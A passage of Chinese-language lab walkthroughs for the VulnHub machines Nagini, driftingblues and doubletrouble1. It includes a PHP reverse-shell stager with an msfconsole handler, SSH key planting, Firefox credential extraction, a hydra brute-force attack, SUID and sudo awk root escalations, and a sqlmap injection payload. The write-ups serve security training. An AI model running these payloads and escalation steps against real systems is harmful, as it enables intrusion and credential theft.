&#123; switch ($s_type) &#123; case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') &amp;&amp; ini_get('suhosin.executor.disable_eval')) &#123; $suhosin_bypass=create_function('', $b); $suhosin_bypass(); &#125; else &#123; eval($b); &#125; die();</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> msf 接收</span></span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.82</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img data-src="./Nagini/8.png" alt></p>
<ul>
<li>访问 <a href="http://192.168.1.101/joomla/index.php/" target="_blank" rel="noopener">http://192.168.1.101/joomla/index.php/</a>&lt;&gt;</li>
<li>msf拿到反弹shell</li>
</ul>
<p><img data-src="./Nagini/9.png" alt></p>
<h3 id="收集信息-amp-amp-提权"><a href="#收集信息-amp-amp-提权" class="headerlink" title="收集信息&amp;&amp;提权"></a>收集信息&amp;&amp;提权</h3><ul>
<li>找到如下信息</li>
</ul>
<p><img data-src="./Nagini/10.png" alt></p>
<p><img data-src="./Nagini/11.png" alt></p>
<ul>
<li>拿到账号密码 <code>snape / Love@lilly</code></li>
<li>ssh 登录 <code>ssh snape@192.168.1.101</code></li>
</ul>
<p><img data-src="./Nagini/12.png" alt></p>
<ul>
<li>发现suid文件</li>
</ul>
<p><img data-src="./Nagini/13.png" alt></p>
<ul>
<li>复制ssh公钥拿到<code>hermoine</code>用户</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCWXpd7SjlptgMF+KQMneYcMAa+OvEabeUAp7pHUYpATaMa2g8o64Oz+wyuAOYVRyn2Lv7ypUPcMl7wqMKsvEOguOiZrU6adKcLb8hvQ+DIadwujvZ1BHR+UER8vMbLoPJB+I+QHN6emD4SBML1592/hZ3ckHmpP8vtnYgUR9Uasjv1W6XVUVjkJlW1Ug4Jd6cY4d7i1rHhfCCw7mytORCzMQBcTesdKHDqKdop8AaAvTczq+qCZeFpGdFeAcuos9WbwRk9Sr4U1HIo/FxMrBwPjNu5GJqqJcFe2InPOL0E3Wzr0WOF6OCm0AVDokIwK6TAsrGybP9WxzN3ZqmA8d7+2uyBq+fZ7KCOpSe642xVS+43QGqbGuPCT8qKQTEbqQH4ZLpGamJ0Jcq6k2XCbvC2qBEBAQPKwyBzRODm5WzwSvCYgCvDXMmsKaI1Y2uIkkWHKIK3b5era0SZBqGWzcfoUc5VkOTtQ9AwXUS9M/CSB+wHdgn00Jf+IKWuy65Tusk= root@kali</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">snape@Nagini:/tmp$ chmod 640 authorized_keys </span><br><span class="line">snape@Nagini:/tmp$ /home/hermoine/bin/su_cp -p /tmp/authorized_keys /home/hermoine/.ssh/</span><br></pre></td></tr></table></figure>

<p><img data-src="./Nagini/14.png" alt></p>
<p><img data-src="./Nagini/15.png" alt></p>
<ul>
<li>发现火狐敏感信息文件</li>
</ul>
<p><img data-src="./Nagini/16.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br><span class="line"></span><br><span class="line">wget http://192.168.1.101:8000/logins.json</span><br><span class="line">wget http://192.168.1.101:8000/key4.db</span><br><span class="line"></span><br><span class="line">python3 firepwd.py</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">b'root',b'@Alohomora#123'</span><br></pre></td></tr></table></figure>

<p><img data-src="./Nagini/17.png" alt></p>
<ul>
<li>拿到root密码<code>@Alohomora#123</code></li>
</ul>
<p><img data-src="./Nagini/18.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>HarryPotter</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>HarryPotter</tag>
      </tags>
  </entry>
  <entry>
    <title>driftingblues</title>
    <url>/2021/05/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/driftingblues/</url>
    <content><![CDATA[<h1 id="driftingblues"><a href="#driftingblues" class="headerlink" title="driftingblues"></a>driftingblues</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>driftingblues</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:51, IPv4: 192.168.43.189</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1	82:9c:c0:df:99:73	(Unknown: locally administered)</span><br><span class="line">192.168.43.33	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.43.77	08:00:27:eb:47:2a	PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.191	38:d2:ca:db:01:69	Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.981 seconds (129.23 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.77</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.77</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.43.77</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-21 23:44 EDT</span><br><span class="line">Nmap scan report for driftingblues (192.168.43.77)</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 ca:e6:d1:1f:27:f2:62:98:ef:bf:e4:38:b5:f1:67:77 (RSA)</span><br><span class="line">|   256 a8:58:99:99:f6:81:c4:c2:b4:da:44:da:9b:f3:b8:9b (ECDSA)</span><br><span class="line">|_  256 39:5b:55:2a:79:ed:c3:bf:f5:16:fd:bd:61:29:2a:b7 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Drifting Blues Tech</span><br><span class="line">MAC Address: 08:00:27:EB:47:2A (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.20 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./driftingblues/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.77/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues]</span><br><span class="line">└─# gobuster dir -u http://192.168.43.77/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php                                                                                      130 ⨯</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.77/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/21 23:46:58 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 7710]</span><br><span class="line">/img                  (Status: 301) [Size: 312] [--&gt; http://192.168.43.77/img/]</span><br><span class="line">/css                  (Status: 301) [Size: 312] [--&gt; http://192.168.43.77/css/]</span><br><span class="line">/js                   (Status: 301) [Size: 311] [--&gt; http://192.168.43.77/js/] </span><br><span class="line">/secret.html          (Status: 200) [Size: 25]                                 </span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                </span><br><span class="line">                                                                               </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/21 23:48:36 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./driftingblues/2.png" alt></p>
<ul>
<li><a href="http://192.168.43.77/secret.html" target="_blank" rel="noopener">http://192.168.43.77/secret.html</a></li>
</ul>
<p><img data-src="./driftingblues/3.png" alt></p>
<ul>
<li>右键查看网页源代码</li>
</ul>
<p><img data-src="./driftingblues/4.png" alt></p>
<p><img data-src="./driftingblues/5.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/noteforkingfish.txt</span><br></pre></td></tr></table></figure>

<h3 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h3><p><a href="http://192.168.43.77/noteforkingfish.txt" target="_blank" rel="noopener">http://192.168.43.77/noteforkingfish.txt</a></p>
<p><img data-src="./driftingblues/6.png" alt></p>
<p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 解密结果</span></span><br><span class="line">my man, i know you are new but you should know how to use host file to reach our secret location. -eric</span><br></pre></td></tr></table></figure>

<h3 id="子域名探测"><a href="#子域名探测" class="headerlink" title="子域名探测"></a>子域名探测</h3><ul>
<li>上一步提醒探测子域名，我们设置hosts <code>192.168.43.77 driftingblues.box</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dnsenum -f /usr/share/dnsenum/dns.txt driftingblues.box</span><br><span class="line"></span><br><span class="line">gobuster vhost -u driftingblues.box -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt | grep "Status: 200"</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues]</span><br><span class="line">└─# gobuster vhost -u driftingblues.box -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt | grep "Status: 200"                                                                                   255 ⨯</span><br><span class="line">Found: test.driftingblues.box (Status: 200) [Size: 24]</span><br><span class="line">Found: Test.driftingblues.box (Status: 200) [Size: 24]</span><br></pre></td></tr></table></figure>

<ul>
<li>配置<code>hosts</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.43.77 test.driftingblues.box</span><br></pre></td></tr></table></figure>

<ul>
<li>访问<a href="http://test.driftingblues.box/robots.txt" target="_blank" rel="noopener">http://test.driftingblues.box/robots.txt</a></li>
</ul>
<p><img data-src="./driftingblues/7.png" alt></p>
<h3 id="查看ssh-cred-txt"><a href="#查看ssh-cred-txt" class="headerlink" title="查看ssh_cred.txt"></a>查看ssh_cred.txt</h3><p><img data-src="./driftingblues/8.png" alt></p>
<ul>
<li>暴力破解密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 生成密码本文件</span></span><br><span class="line">crunch 13 13 -t 1mw4ckyyucky%  &gt;&gt; pwd.txt </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra 暴力破解</span></span><br><span class="line">hydra -l sheryl -P ./pwd.txt 192.168.43.77 -t 4 ssh</span><br><span class="line"></span><br><span class="line">hydra -l eric -P ./pwd.txt 192.168.43.77 -t 4 ssh</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues]</span><br><span class="line">└─# hydra -l eric -P ./pwd.txt 192.168.43.77 -t 4 ssh</span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-22 01:34:52</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 10 login tries (l:1/p:10), ~3 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.43.77:22/</span><br><span class="line">[22][ssh] host: 192.168.43.77   login: eric   password: 1mw4ckyyucky6</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-22 01:34:56</span><br></pre></td></tr></table></figure>

<ul>
<li>登录 <code>eric / 1mw4ckyyucky6</code></li>
</ul>
<p><img data-src="./driftingblues/9.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><ul>
<li><code>pspy64</code></li>
</ul>
<p><img data-src="./driftingblues/10.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">eric@driftingblues:/var/backups$ cat backup.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">/usr/bin/zip -r -0 /tmp/backup.zip /var/www/</span><br><span class="line">/bin/chmod</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">having a backdoor would be nice</span></span><br><span class="line">sudo /tmp/emergency</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 提权</span><br><span class="line">echo &#39;cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;getroot; chmod +s &#x2F;tmp&#x2F;getroot&#39; &gt; &#x2F;tmp&#x2F;emergency</span><br><span class="line"></span><br><span class="line">chmod +x &#x2F;tmp&#x2F;emergency</span><br></pre></td></tr></table></figure>

<p><img data-src="./driftingblues/11.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./getroot -p</span><br></pre></td></tr></table></figure>

<p><img data-src="./driftingblues/12.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>driftingblues</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>doubletrouble1</title>
    <url>/2023/03/21/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/doubletrouble1/</url>
    <content><![CDATA[<h1 id="doubletrouble1"><a href="#doubletrouble1" class="headerlink" title="doubletrouble1"></a>doubletrouble1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>doubletrouble1</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\doubletrouble1&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.102</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.161   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.242   3c:7c:3f:d3:05:d5       (Unknown)</span><br><span class="line"></span><br><span class="line">8 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.030 seconds (126.11 hosts/sec). 8 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.161</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.161</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\doubletrouble1&gt; nmap -sV -A -p 1-65535 192.168.1.161</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 17:58 EDT</span><br><span class="line">Nmap scan report for doubletrouble.lan (192.168.1.161)</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)</span><br><span class="line">|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)</span><br><span class="line">|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: qdPM | Login</span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.26 ms doubletrouble.lan (192.168.1.161)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.161/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\doubletrouble1&gt; gobuster dir -u http://192.168.1.161/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.161/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/09/16 18:00:14 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 315] [--&gt; http://192.168.1.161/images/]</span><br><span class="line">/index.php            (Status: 200) [Size: 5812]                                  </span><br><span class="line">/uploads              (Status: 301) [Size: 316] [--&gt; http://192.168.1.161/uploads/]</span><br><span class="line">/css                  (Status: 301) [Size: 312] [--&gt; http://192.168.1.161/css/]    </span><br><span class="line">/template             (Status: 301) [Size: 317] [--&gt; http://192.168.1.161/template/]</span><br><span class="line">/core                 (Status: 301) [Size: 313] [--&gt; http://192.168.1.161/core/]    </span><br><span class="line">/install              (Status: 301) [Size: 316] [--&gt; http://192.168.1.161/install/] </span><br><span class="line">/js                   (Status: 301) [Size: 311] [--&gt; http://192.168.1.161/js/]      </span><br><span class="line">/check.php            (Status: 200) [Size: 0]                                       </span><br><span class="line">/sf                   (Status: 301) [Size: 311] [--&gt; http://192.168.1.161/sf/]      </span><br><span class="line">/robots.txt           (Status: 200) [Size: 26]                                      </span><br><span class="line">/readme.txt           (Status: 200) [Size: 470]                                     </span><br><span class="line">/secret               (Status: 301) [Size: 315] [--&gt; http://192.168.1.161/secret/]  </span><br><span class="line">/backups              (Status: 301) [Size: 316] [--&gt; http://192.168.1.161/backups/] </span><br><span class="line">/batch                (Status: 301) [Size: 314] [--&gt; http://192.168.1.161/batch/]   </span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                     </span><br><span class="line">                                                                                    </span><br><span class="line">===============================================================</span><br><span class="line">2021/09/16 18:02:22 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./doubletrouble1/1.png" alt></p>
<ul>
<li>发现敏感信息如下</li>
</ul>
<p><img data-src="./doubletrouble1/2.png" alt></p>
<ul>
<li>数据库账号密码为 <code>otis / rush</code></li>
</ul>
<h3 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h3><p><a href="http://192.168.6.244/secret/" target="_blank" rel="noopener">http://192.168.6.244/secret/</a></p>
<p><a href="http://192.168.6.244/secret/doubletrouble.jpg" target="_blank" rel="noopener">http://192.168.6.244/secret/doubletrouble.jpg</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://192.168.6.244/secret/doubletrouble.jpg</span><br><span class="line">steghide extract -sf   doubletrouble.jpg</span><br></pre></td></tr></table></figure>

<p><img data-src="./doubletrouble1/3.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">stegcracker doubletrouble.jpg /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\doubletrouble1&gt; stegcracker doubletrouble.jpg /usr/share/wordlists/rockyou.txt</span><br><span class="line">StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)</span><br><span class="line">Copyright (c) 2023 - Luke Paris (Paradoxis)</span><br><span class="line"></span><br><span class="line">StegCracker has been retired following the release of StegSeek, which </span><br><span class="line">will blast through the rockyou.txt wordlist within 1.9 second as opposed </span><br><span class="line">to StegCracker which takes ~5 hours.</span><br><span class="line"></span><br><span class="line">StegSeek can be found at: https://github.com/RickdeJager/stegseek</span><br><span class="line"></span><br><span class="line">Counting lines in wordlist..</span><br><span class="line">Attacking file 'doubletrouble.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..</span><br><span class="line">Successfully cracked file with password: 92camaros</span><br><span class="line">Tried 134276 passwords</span><br><span class="line">Your file has been written to: doubletrouble.jpg.out</span><br><span class="line">92camaro</span><br><span class="line"></span><br><span class="line">C:\root\vulnhub\doubletrouble1&gt; cat creds.txt            </span><br><span class="line">otisrush@localhost.com</span><br><span class="line">otis666</span><br></pre></td></tr></table></figure>

<ul>
<li>得到账号密码 <code>otisrush@localhost.com / otis666</code></li>
</ul>
<h3 id="qbPM9-1-RCE"><a href="#qbPM9-1-RCE" class="headerlink" title="qbPM9.1 RCE"></a>qbPM9.1 RCE</h3><ul>
<li>CVE-2020-7246</li>
</ul>
<p><a href="https://github.com/TobinShields/qdPM9.1_Exploit.git" target="_blank" rel="noopener">https://github.com/TobinShields/qdPM9.1_Exploit.git</a></p>
<ul>
<li>实际使用存在bug，不过可以利用此脚本上传反弹shell</li>
</ul>
<p><img data-src="./doubletrouble1/4.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 7777</span><br></pre></td></tr></table></figure>

<p><img data-src="./doubletrouble1/5.png" alt></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@doubletrouble:/tmp$ sudo -l </span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for www-data on doubletrouble:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on doubletrouble:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/awk</span><br><span class="line"></span><br><span class="line">sudo awk 'BEGIN &#123;system("/bin/sh")&#125;'</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo awk <span class="string">'BEGIN &#123;system("/bin/sh")&#125;'</span></span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">ls /root</span><br><span class="line">doubletrouble.ova</span><br><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>

<p><img data-src="./doubletrouble1/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget doubletrouble.ova</span><br></pre></td></tr></table></figure>

<h3 id="登录web-inner"><a href="#登录web-inner" class="headerlink" title="登录web(inner)"></a>登录web(inner)</h3><p><img data-src="./doubletrouble1/7.png" alt></p>
<ul>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.6.170</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">none</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.6.170/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">none</span><br></pre></td></tr></table></figure>

<h3 id="SQL注入-inner"><a href="#SQL注入-inner" class="headerlink" title="SQL注入(inner)"></a>SQL注入(inner)</h3><ul>
<li>sqlmap</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: uname (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: uname=123' AND (SELECT 4296 FROM (SELECT(SLEEP(5)))fNBe) AND 'ekCk'='ekCk&amp;psw=123&amp;btnLogin=Login</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">sqlmap -r 1.txt --current-db</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">current database: 'doubletrouble'</span><br><span 